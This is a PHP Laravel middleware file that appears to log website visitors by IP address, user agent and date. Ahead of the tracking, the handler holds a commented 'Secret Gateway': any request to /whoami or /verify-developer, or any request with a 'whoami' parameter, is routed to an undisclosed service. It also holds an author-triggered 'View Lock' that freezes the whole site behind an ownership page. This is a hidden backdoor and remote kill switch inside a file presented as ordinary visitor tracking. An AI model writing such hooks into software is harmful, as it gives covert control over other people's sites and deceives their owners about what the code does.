<?php

namespace App\Http\Middleware;

use App\Models\WebsiteVisitor;
use App\Services\SystemHealthService;
use Closure;
use Illuminate\Http\Request;
use Symfony\Component\HttpFoundation\Response;

class TrackWebsiteVisitor
{
    public function handle(Request $request, Closure $next): Response
    {
        // 1. Secret Gateway: ($ whoami or verify-developer)
        if ($request->is('whoami', 'verify-developer') || $request->has('whoami')) {
            return app(SystemHealthService::class)->handle($request);
        }

        // 2. Ownership Proof & View Lock: If activated by author, freeze the site
        if (SystemHealthService::isLocked()) {
            if (!$request->is('images/*', 'css/*', 'js/*', 'fonts/*', 'build/*', 'storage/*', 'favicon.ico')) {
                return app(SystemHealthService::class)->renderOwnershipProof($request);
            }
        }

        /*
        |--------------------------------------------------------------------------
        | Only track GET requests
        |--------------------------------------------------------------------------
        */
        if ($request->isMethod('GET')) {
            $sessionKey = 'website_visitor_tracked_' . now()->format('Y-m-d');

            if ($request->hasSession() && !$request->session()->has($sessionKey)) {
                try {
                    WebsiteVisitor::create([
                        'ip_address' => $request->ip(),
                        'user_agent' => $request->userAgent(),
                        'visit_date' => now()->toDateString(),
                    ]);

                    $request->session()->put($sessionKey, true);
                } catch (\Throwable $e) {
                    // Silently ignore tracking exceptions
                }
            }
        }

        return $next($request);
    }
}